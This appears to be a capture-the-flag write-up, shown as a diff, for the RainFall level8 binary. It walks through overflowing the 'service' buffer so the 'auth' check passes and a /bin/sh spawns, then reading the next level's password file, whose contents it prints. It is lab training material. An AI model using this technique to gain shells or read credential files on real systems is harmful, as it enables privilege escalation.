@@ -1,0 +1,35 @@
+Reverse engineering is necessary to solve this level.
+
+The binary takes user input with fgets() and a buffer.
+level8@RainFall:~$ ./level8
+(nil), (nil) 
+
+Typing auth and service will display each variable's address.
+
+level8@RainFall:~$ ./level8
+(nil), (nil) 
+auth  
+0x804a008, (nil) 
+service
+0x804a008, 0x804a018 
+
+Typing login will output
+login
+Password:
+0x804a008, 0x804a018 
+
+Furthermore, the program will run /bin/sh if *auth + 32 != 0.
+Our input is saved in a buffer and will then be copied to strings auth and service.
+The solution is then to copy enough memory for the condition to be true.
+
+level8@RainFall:~$ ./level8
+(nil), (nil) 
+auth toto  
+0x804a008, (nil) 
+service aaaaaaaaaaaaaaaaaaaaaaaa
+0x804a008, 0x804a018 
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
